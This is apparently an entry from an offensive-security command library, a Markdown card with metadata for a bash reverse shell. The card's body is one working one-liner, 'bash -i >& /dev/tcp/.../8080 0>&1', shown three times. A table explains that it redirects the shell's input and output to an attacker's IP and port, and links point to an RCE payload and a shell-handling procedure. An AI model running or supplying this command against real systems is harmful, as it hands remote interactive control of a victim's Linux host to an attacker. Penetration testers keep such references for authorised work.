---
data: bash -c 'bash -i >& /dev/tcp/███/8080 0>&1'
tags:
  - reverse-shell
type: command
executor: bash
platforms:
  - Linux
id: 580df045-6d3c-4f8a-9a55-2301ab0b1b3b
created_at: '2025-12-11T06:10:33.004Z'
updated_at: '2025-12-11T06:10:33.004Z'
verified: false
validated: true
submitted: true
---
# bash-reverse-shell

## Command

```bash
bash -c 'bash -i >& /dev/tcp/███/8080 0>&1'
```

## Description

Executes an interactive bash reverse shell by redirecting I/O to a TCP connection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Interactive shell | Yes |
| `>& /dev/tcp/███/8080 0>&1` | Redirects stdin/stdout/stderr to TCP on attacker's IP and port 8080 | Yes |

## Examples

### Basic Usage

```bash
bash -c 'bash -i >& /dev/tcp/███/8080 0>&1'
```

## Expected Output

Reverse shell connection to the listener.

## Related

- [[commands/postscript-payload-rce]]
- [[procedures/Receive-and-Interact-with-Reverse-Shell]]
